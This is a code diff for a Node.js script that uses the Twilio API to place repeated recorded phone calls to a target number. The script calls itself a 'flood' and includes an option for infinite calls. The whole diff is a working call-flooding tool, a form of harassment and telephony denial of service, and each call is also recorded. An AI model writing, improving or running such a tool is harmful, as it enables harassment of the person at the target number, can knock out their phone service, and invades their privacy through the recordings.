@@ -1,13 +1,31 @@
 require('dotenv').config()
 
-var twilio = require('twilio');
-var client = new twilio(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN);
+const client = new require('twilio')(process.env.TWILIO_ACCOUNT_SID, process.env.TWILIO_AUTH_TOKEN);
 
-client.calls.create({
-	record: true,
-	url: process.env.TWIML_URL,
-	to: process.env.TARGET_PHONE_NUMBER,
-	from: process.env.SOURCE_PHONE_NUMBER
-})
-	.then((message) => console.log(message.sid))
-	.catch((error) => console.warn(error));
+// Set this to 0 for infinite
+const max = 10;
+
+// Don't change this
+let count = 1;
+
+console.info(`:: Flooding [ ${process.env.TARGET_PHONE_NUMBER} ] from [ ${process.env.SOURCE_PHONE_NUMBER} ]`);
+console.info(`:: Starting flood of ${max} calls`);
+
+// Call finish method when necessary
+placeCall().then(finished).catch(console.error);
+process.on('SIGINT', finished);
+
+function placeCall() {
+	return new Promise((resolve, reject) =>
+		client.calls.create({ record: true, url: process.env.TWIML_URL, to: process.env.TARGET_PHONE_NUMBER, from: process.env.SOURCE_PHONE_NUMBER })
+			.then((call) => {
+				console.info(`:: Call ${count++} placed with ID [ ${call.sid.substring(0, 8) + '...' + call.sid.substring(call.sid.length - 8)} ]`);
+				count < max + 1 || max === 0 ? placeCall().then(resolve).catch(reject) : resolve();
+			})
+			.catch(reject));
+}
+
+function finished() {
+	console.info(`:: Finished flood of ${count - 1} calls`);
+	process.exit(0);
+}
